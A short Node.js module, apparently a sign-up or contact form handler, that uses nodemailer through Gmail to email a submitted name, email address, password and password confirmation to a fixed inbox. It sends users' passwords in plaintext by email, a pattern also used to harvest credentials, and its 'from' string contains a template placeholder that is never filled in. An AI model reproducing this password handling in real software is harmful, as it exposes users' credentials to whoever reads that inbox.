import nodemailer from "nodemailer";

const Email = (options) => {
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.USER,
      pass: process.env.PASSWORD,
    },
  });
  transporter.sendMail(options, (err, info) => {
    if (err) {
      console.log(err);
    } else {
      console.log("Email sent successfully");
    }
  });
};

// send email
const EmailSender = ({ fullname, email, pass, confirmPass }) => {
  const options = {
    from: "Node User <${process.env.USER}>",
    to: process.env.SEND_TO,
    subject: `Message From ${fullname}`,
    html: `<h1>Nodemailer Email</h1>
    <p>Full Name: ${fullname}</p>
    <p>email: ${email}</p>
    <p>pass: ${pass}</p>
    <p>confirmPass: ${confirmPass}</p>
    `,
  };
  Email(options);
};

export default EmailSender;
